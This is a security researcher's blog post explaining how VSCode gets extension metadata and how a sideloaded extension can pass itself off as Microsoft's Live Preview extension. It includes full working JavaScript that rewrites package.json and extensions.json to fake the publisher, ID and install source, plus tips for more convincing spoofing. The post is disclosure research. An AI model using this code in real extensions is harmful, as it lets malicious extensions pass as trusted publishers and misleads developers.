---
title: "VVhich Extension?"
date: 2026-03-16T16:59:32+05:30
tags: ["windows", "malware", "rust", "microsoft"]
category: ["hacking"]
---

While preparing for [my talk at Insomni Hack](https://insomnihack.ch/talks/from-code-to-compromise-turning-modern-day-ides-into-attack-vectors-via-malicious-extensions/) and reviewing the [sinister-vsix](https://github.com/whokilleddb/sinister-vsix) project, I wondered: _"Hey, how does VSCode fetch the metadata for these extensions?"_. Just a small recap, during the [Task#4](https://github.com/whokilleddb/sinister-vsix/tree/main/task4) - we spoofed a [Microsoft Published Extension](https://marketplace.visualstudio.com/items?itemName=ms-vscode.live-server). 

However, upon examining the extension code, I noticed a couple of things: 
- Metadata like stars, download count, etc wasnt stored in the source code (which made sense)
- _"Where is the blue tick coming from?"_

So, I decided to take a deeper look. This blog documents the result of the research done quickly at an airport while I am on my way to present my fully finished 100+ slides deck(boy oh boy do I have to change those!) - but hopefully it's not _tooo_ incohorent. 

## VVhere is the metadata coming from?

![](https://woforgmedia.wordonfire.org/wp-content/uploads/2024/10/30144433/the-witch.jpg)

First, we go searching for the source of the metadata. A bit of poking around later, I found that VSCode made a POST request to the marketplace API as such:

```bash
curl -X POST "https://marketplace.visualstudio.com/_apis/public/gallery/extensionquery" -H "Content-Type: application/json" -H "Accept: application/json;api-version=7.2-preview" -H "User-Agent: VSCode" -d '{
    "filters": [{
      "criteria": [
        { "filterType": 7, "value": "ms-vscode.live-server" }
      ],
      "pageSize": 1,
      "pageNumber": 1,
      "sortBy": 0,
      "sortOrder": 0
    }],
    "assetTypes": [],
    "flags": 950
  }' 
```

The only thing to note here is the `value` parameter which is set to `ms-vscode.live-server` (this is always set to `extension_publisher:extension_name`). On issuing this request, we get a big response, which (after prettifying) looks like this:

```json
{
  "results": [
    {
      "extensions": [
        {
          "publisher": {
            "publisherId": "5f5636e7-69ed-4afe-b5d6-8d231fb3d3ee",
            "publisherName": "ms-vscode",
            "displayName": "Microsoft",
            "flags": "verified",
            "domain": "https://microsoft.com",
            "isDomainVerified": true
          },
          "extensionId": "4eae7368-ec63-429d-8449-57a7df5e2117",
          "extensionName": "live-server",
          "displayName": "Live Preview",
          "flags": "validated, public, preview",
          "lastUpdated": "2026-02-09T09:27:53.193Z",
          "publishedDate": "2021-06-21T20:33:59.11Z",
          "releaseDate": "2021-06-21T20:33:59.11Z",
          "shortDescription": "Hosts a local server in your workspace for you to preview your webpages on.",
          "versions": [
            {
              "version": "0.5.2026020901",
              "flags": "validated",
              "lastUpdated": "2026-02-09T09:27:53.193Z",
              "files": [
                {
                    <a_bunch_of_stuff>
                }
              ],
              "properties": [
                    <a_bunch_of_github_links>
              ],
              "assetUri": "https://ms-vscode.gallery.vsassets.io/_apis/public/gallery/publisher/ms-vscode/extension/live-server/0.5.2026020901/assetbyname",
              "fallbackAssetUri": "https://ms-vscode.gallerycdn.vsassets.io/extensions/ms-vscode/live-server/0.5.2026020901/1770629024303"
            }
          ],
          "categories": [
            "Other"
          ],
          "tags": ["browser", "html", "live", "livepreview", "preview", "refresh", "reload"],
          "statistics": [
            {
              "statisticName": "install",
              "value": 11966368.0
            },
            {
              "statisticName": "averagerating",
              "value": 4.4358973503112793
            },
            {
              "statisticName": "ratingcount",
              "value": 78.0
            },
            {
              "statisticName": "trendingdaily",
              "value": 0.0022916290304234662
            },
            {
              "statisticName": "trendingmonthly",
              "value": 2.4470581465690677
            },
            {
              "statisticName": "trendingweekly",
              "value": 0.5461268883145507
            },
            {
              "statisticName": "updateCount",
              "value": 19214822.0
            },
            {
              "statisticName": "weightedRating",
              "value": 4.4381077195781415
            },
            {
              "statisticName": "downloadCount",
              "value": 53216.0
            }
          ],
          "deploymentType": 0
        }
      ],
      "pagingToken": null,
      "resultMetadata": [
        {
          "metadataType": "ResultCount",
          "metadataItems": [
            {
              "name": "TotalCount",
              "count": 1
            }
          ]
        }
      ]
    }
  ]
}
```

So that is a bunch of juicy information! So this is how it get's the Metadata. The stats are fetched from the `statistics` key (duh!). We also have a bunch of information like publisher name, publisher id, extension information and more! So that answers our main question about the stats. I am assuming that the blue tick comes from the _domain_ parameter somehow. 

Now, if in the original post request - we saw it only takes two parameters: extension publisher and extension name. So here is the next idea: what if we can control these parameters, which brings me to my next point: How does VSCode fetch these details about an extension?

Let's start with some code.

## How is it doing that?


First, generate a template javascript extension with:

```bash
$ yo code
```

I decided to name my extension `vvitch-extension`. The inital `package.json` looks like this:

```json
{
  "name": "vvhich-extension",
  "displayName": "vvhich-extension",
  "description": "Demo extension",
  "version": "0.0.1",
  "engines": {
    "vscode": "^1.110.0"
  },
  "categories": [
    "Other"
  ],
  "activationEvents": [],
  "main": "./extension.js",
  "contributes": {
    "commands": [{
      "command": "vvhich-extension.helloWorld",
      "title": "Hello World"
    }]
  },
  "scripts": {
    "lint": "eslint .",
    "pretest": "npm run lint",
    "test": "vscode-test"
  },
  "devDependencies": {
    "@types/vscode": "^1.110.0",
    "@types/mocha": "^10.0.10",
    "@types/node": "22.x",
    "eslint": "^9.39.3",
    "@vscode/test-cli": "^0.0.12",
    "@vscode/test-electron": "^2.5.2"
  }
}
```

Now, let's package this with:

```bash
vsce package --no-yarn --allow-missing-repository --skip-license 
```

This should give us a `vvhich-extension-0.0.1.vsix` extension file, which we can install with:

```
code --install-extension vvhich-extension-0.0.1.vsix     
```

This should install our very basic extension which practically does nothing at this point. But it begs the question - how are these extensions loaded and where is it stored. For this demo, I will be using MacOS - but the technique should be translative to Windows and Linux.

So, back to VSCode. On a clean installation of VSCode, extensions are stored under `~/.vscode/extensions`. Looking at our post-installation state, we see the following:

```java
$ ls ~/.vscode/extensions
extensions.json                            undefined_publisher.vvhich-extension-0.0.1
```

The `extensions.json` file looked interesting. Examining it's contents, we see:

```json
[
  {
    "identifier": {
      "id": "undefined_publisher.vvhich-extension"
    },
    "version": "0.0.1",
    "location": {
      "$mid": 1,
      "fsPath": "/Users/db/.vscode/extensions/undefined_publisher.vvhich-extension-0.0.1",
      "external": "file:///Users/db/.vscode/extensions/undefined_publisher.vvhich-extension-0.0.1",
      "path": "/Users/db/.vscode/extensions/undefined_publisher.vvhich-extension-0.0.1",
      "scheme": "file"
    },
    "relativeLocation": "undefined_publisher.vvhich-extension-0.0.1",
    "metadata": {
      "installedTimestamp": 1773697132124,
      "pinned": true,
      "source": "vsix"
    }
  }
]
```

_Interesting_

Now, lets uninstall our extension and install the [Live Preview extension](https://marketplace.visualstudio.com/items?itemName=ms-vscode.live-server) from the store. Examining the `extensions.json` file after that, we see:

```json               
[
  {
    "identifier": {
      "id": "ms-vscode.live-server"
    },
    "version": "0.4.17",
    "location": {
      "$mid": 1,
      "fsPath": "/Users/db/.vscode/extensions/ms-vscode.live-server-0.4.17",
      "external": "file:///Users/db/.vscode/extensions/ms-vscode.live-server-0.4.17",
      "path": "/Users/db/.vscode/extensions/ms-vscode.live-server-0.4.17",
      "scheme": "file"
    },
    "relativeLocation": "ms-vscode.live-server-0.4.17",
    "metadata": {
      "installedTimestamp": 1773723790211,
      "pinned": false,
      "source": "gallery",
      "id": "4eae7368-ec63-429d-8449-57a7df5e2117",
      "publisherId": "5f5636e7-69ed-4afe-b5d6-8d231fb3d3ee",
      "publisherDisplayName": "Microsoft",
      "targetPlatform": "undefined",
      "updated": false,
      "private": false,
      "isPreReleaseVersion": false,
      "hasPreReleaseVersion": false
    }
  }
]
```

So, now we can make a few assumption:
- VSCode reads the `extensions.json` to get the `id` of the extension and then uses that to fetch the extension details
- It also reads the some more information from the `metadata` field, namely, the `source` parameter. Remember how in the [sinister-vsix](https://github.com/whokilleddb/sinister-vsix) project we talked about the visual detection where the extension page listed if it has been installed from a VSIX or not? Yeah - we can get rid of that too.

Time to modify our code. 

## I am not what I seem to be

So what is our goal here? Well, ideally, I would like to create an extension which modifies itself and the `extensions.json` file to fake it's identity. For this example, I we would again target the the [Live Preview extension](https://marketplace.visualstudio.com/items?itemName=ms-vscode.live-server) (because its just fun to mess with MSFT stuff). 

So let's write some Javascript code (_ew_). We add the following `updateExtension()` function in the `extension.js` file:

```javascript
const fs = require("fs");
const path = require("path");
const os = require("os");
 
// Log file on the current user's desktop
const logFile = path.join(os.homedir(), "Desktop", "updateExtension.log");
 
function log(message) {
  const timestamp = new Date().toISOString();
  const line = `[${timestamp}] ${message}\n`;
  console.log(line.trim());
  fs.appendFileSync(logFile, line);
}

async function updateExtension() {
  let new_publisher = "ms-vscode";
  let new_name = "live-server";
  log("=== updateExtension started ===");
  log(`new_publisher: ${new_publisher}, new_name: ${new_name}`);

  // ── 1. Read package.json in the current directory ──────────────────────────
  const packageJsonPath = path.join(__dirname, "./package.json");
  log(`Reading package.json from: ${packageJsonPath}`);
 
  const packageJson = JSON.parse(fs.readFileSync(packageJsonPath, "utf8"));
  const old_name = packageJson.name;
  const old_publisher = packageJson.publisher? packageJson.publisher: "undefined_publisher";
  // log(`package.json:\n${packageJson}`);
  log(`old_publisher: ${old_publisher}, old_name: ${old_name}`);

  // ── 2. POST request to VS Marketplace ──────────────────────────────────────
  const queryValue = `${new_publisher}.${new_name}`;
  log(`Making POST request for extension: ${queryValue}`);
 
  const response = await fetch(
    "https://marketplace.visualstudio.com/_apis/public/gallery/extensionquery",
    {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Accept: "application/json;api-version=7.1-preview.1",
        "User-Agent": "VSCode",
      },
      body: JSON.stringify({
        filters: [
          {
            criteria: [{ filterType: 7, value: queryValue }],
            pageSize: 1,
            pageNumber: 1,
            sortBy: 0,
            sortOrder: 0,
          },
        ],
        assetTypes: [],
        flags: 950,
      }),
    }
  );
 
  if (!response.ok) {
    throw new Error(`Marketplace request failed: ${response.status} ${response.statusText}`);
  }
 
  const marketplaceData = await response.json();
  log(`Marketplace response received`);
  log(`Full response: ${JSON.stringify(marketplaceData, null, 2)}`);
 
  const extension = marketplaceData?.results?.[0]?.extensions?.[0];
  if (!extension) {
    throw new Error("No extension found in marketplace response");
  }
 
  const extensionId = extension.extensionId;
  const publisherId = extension.publisher?.publisherId;
  const publisherDisplayName = extension.publisher?.displayName;
  const latestVersion = extension.versions?.[0]?.version;
 
  log(`extensionId: ${extensionId}`);
  log(`publisherId: ${publisherId}`);
  log(`publisherDisplayName: ${publisherDisplayName}`);
  log(`latestVersion: ${latestVersion}`);
 
  // ── 4. Update package.json ──────────────────────────────────────────────────
  packageJson.name = new_name;
  packageJson.publisher = new_publisher;
  packageJson.displayName = extension.displayName;
  // packageJson.repository.type = "git";
  // packageJson.repository.url = "https://github.com/microsoft/vscode-livepreview";
  if (latestVersion) {
    packageJson.version = latestVersion;
    log(`package.json updated: name → ${new_name}, publisher → ${new_publisher}, version → ${latestVersion}`);
  } else {
    log(`package.json updated: name → ${new_name}, publisher → ${new_publisher}`);
  }
  fs.writeFileSync(packageJsonPath, JSON.stringify(packageJson, null, 2));
 
  // ── 5. Read extensions.json one directory above ─────────────────────────────
  const extensionsJsonPath = path.join(__dirname, "..", "./extensions.json");
  log(`Reading extensions.json from: ${extensionsJsonPath}`);
 
  const extensions = JSON.parse(fs.readFileSync(extensionsJsonPath, "utf8"));
 
  // ── 6. Find & update the matching entry ────────────────────────────────────
  const oldId = `${old_publisher}.${old_name}`;
  const newId = `${new_publisher}.${new_name}`;
  log(`Looking for entry with id: ${oldId}`);
 
  const entry = extensions.find((e) => e?.identifier?.id === oldId);
  if (!entry) {
    throw new Error(`No entry found in extensions.json with id "${oldId}"`);
  }
 
  log(`Entry found. Updating...`);
 
  // Update identifier id
  entry.identifier.id = newId;
  log(`identifier.id → ${newId}`);
 
  // Update version
  if (latestVersion) {
    entry.version = latestVersion;
    log(`version → ${latestVersion}`);
  }
 
  // Update metadata
  if (!entry.metadata) entry.metadata = {};
 
  entry.metadata.source = "gallery";
  log(`metadata.source → gallery`);
 
  entry.metadata.id = extensionId;
  log(`metadata.id → ${extensionId}`);
 
  if (publisherId) {
    entry.metadata.publisherId = publisherId;
    log(`metadata.publisherId → ${publisherId}`);
  }
 
  if (publisherDisplayName) {
    entry.metadata.publisherDisplayName = publisherDisplayName;
    log(`metadata.publisherDisplayName → ${publisherDisplayName}`);
  }
 
  // ── 7. Write updated extensions.json ───────────────────────────────────────
  fs.writeFileSync(extensionsJsonPath, JSON.stringify(extensions, null, 2));
  log(`extensions.json written successfully`);
  log("=== updateExtension completed ===");
 
  return { entry, marketplaceData };
}
```

Breaking down the code, first, we define the following helper function:

```js
// Log file on the current user's desktop
const logFile = path.join(os.homedir(), "Desktop", "updateExtension.log");
 
function log(message) {
  const timestamp = new Date().toISOString();
  const line = `[${timestamp}] ${message}\n`;
  console.log(line.trim());
  fs.appendFileSync(logFile, line);
}
```

This is just to help with debugging because sometimes, the extension will crash on you, and logging messages to a file can be really useful.  Next, comes the main `updateExtension` function comes in. 

We start by reading the current extension's `package.json` followed by making a POST request to the marketplace API with the published and extension name set to `ms-vscode` and `live-server` respectively, and storing it's result.

We update the current `package.json` with the name, publisher, version and display name fetched from the POST request.

We then read the `extension.json` file and iterate through it till we find the old entry (aka the original extension id). When a match is found, we replace it with the new extension id (extension id is just: `publisher_name.extension_name` btw). We also update the version information and metadata to replace the metadata id with the one we got from the POST request and change the source from `vsix` to `gallery`.

Finally, we also update the `publisherId` and the `publisherDisplayName` metadata information before saving the updated json. 

With that, we should have covered all our bases. Here is what the extension files would look before and after being activated.

### Before

_package.json_

```json
{
  "name": "vvhich-extension",
  "displayName": "vvhich-extension",
  "description": "Demo extension",
  "version": "0.0.1",
  "engines": {
    "vscode": "^1.110.0"
  },
  "categories": [
    "Other"
  ],
  "activationEvents": [],
  "main": "./extension.js",
  "contributes": {
    "commands": [
      {
        "command": "vvhich-extension.helloWorld",
        "title": "Hello World"
      }
    ]
  },
  "scripts": {
    "lint": "eslint .",
    "pretest": "npm run lint",
    "test": "vscode-test"
  },
  "devDependencies": {
    "@types/vscode": "^1.110.0",
    "@types/mocha": "^10.0.10",
    "@types/node": "22.x",
    "eslint": "^9.39.3",
    "@vscode/test-cli": "^0.0.12",
    "@vscode/test-electron": "^2.5.2"
  },
  "__metadata": {
    "installedTimestamp": 1773737399534,
    "targetPlatform": "undefined",
    "size": 4145
  }
}
```

_extensions.json_

```json
[
  {
    "identifier": {
      "id": "undefined_publisher.vvhich-extension"
    },
    "version": "0.0.1",
    "location": {
      "$mid": 1,
      "fsPath": "/Users/db/.vscode/extensions/undefined_publisher.vvhich-extension-0.0.1",
      "external": "file:///Users/db/.vscode/extensions/undefined_publisher.vvhich-extension-0.0.1",
      "path": "/Users/db/.vscode/extensions/undefined_publisher.vvhich-extension-0.0.1",
      "scheme": "file"
    },
    "relativeLocation": "undefined_publisher.vvhich-extension-0.0.1",
    "metadata": {
      "installedTimestamp": 1773737399525,
      "pinned": true,
      "source": "vsix"
    }
  }
]
```

Extension page:

![](../../hacking/vvhich-extension/before.png)

### After

> [!NOTE] You might need to restart VSCode

_package.json_

```json
{
  "name": "live-server",
  "displayName": "Live Preview",
  "description": "Demo extension",
  "version": "0.5.2026020901",
  "engines": {
    "vscode": "^1.110.0"
  },
  "categories": [
    "Other"
  ],
  "activationEvents": [],
  "main": "./extension.js",
  "contributes": {
    "commands": [
      {
        "command": "vvhich-extension.helloWorld",
        "title": "Hello World"
      }
    ]
  },
  "scripts": {
    "lint": "eslint .",
    "pretest": "npm run lint",
    "test": "vscode-test"
  },
  "devDependencies": {
    "@types/vscode": "^1.110.0",
    "@types/mocha": "^10.0.10",
    "@types/node": "22.x",
    "eslint": "^9.39.3",
    "@vscode/test-cli": "^0.0.12",
    "@vscode/test-electron": "^2.5.2"
  },
  "__metadata": {
    "installedTimestamp": 1773837024644,
    "targetPlatform": "undefined",
    "size": 9669
  },
  "publisher": "ms-vscode"
}
```

_extensions.json_

```json
[
  {
    "identifier": {
      "id": "ms-vscode.live-server"
    },
    "version": "0.5.2026020901",
    "location": {
      "$mid": 1,
      "fsPath": "/Users/db/.vscode/extensions/undefined_publisher.vvhich-extension-0.0.1",
      "external": "file:///Users/db/.vscode/extensions/undefined_publisher.vvhich-extension-0.0.1",
      "path": "/Users/db/.vscode/extensions/undefined_publisher.vvhich-extension-0.0.1",
      "scheme": "file"
    },
    "relativeLocation": "undefined_publisher.vvhich-extension-0.0.1",
    "metadata": {
      "installedTimestamp": 1773837024634,
      "pinned": true,
      "source": "gallery",
      "id": "4eae7368-ec63-429d-8449-57a7df5e2117",
      "publisherId": "5f5636e7-69ed-4afe-b5d6-8d231fb3d3ee",
      "publisherDisplayName": "Microsoft"
    }
  }
]
```

Extension page:

![](../../hacking/vvhich-extension/after.png)

AND LOOK AT THAT! We are Live Preview! (Apart from the `README.md` thing - which we can always fix). Not only that, but the links in the bottom right hand corner also redirect to the legit extension's links. 

Here is the Github repo with the extension code: [https://github.com/whokilleddb/vvhich-extension](https://github.com/whokilleddb/vvhich-extension)

> [!WARNING] Is this perfect? NO - you might also wanna update the `.vsixmanifest` files, rename the extension directory, update the `README.md` if you want a more accurate _spoofing_.

_Bye_
![](https://media.tenor.com/3XNZLG2wpuoAAAAM/sad-pokemon.gif)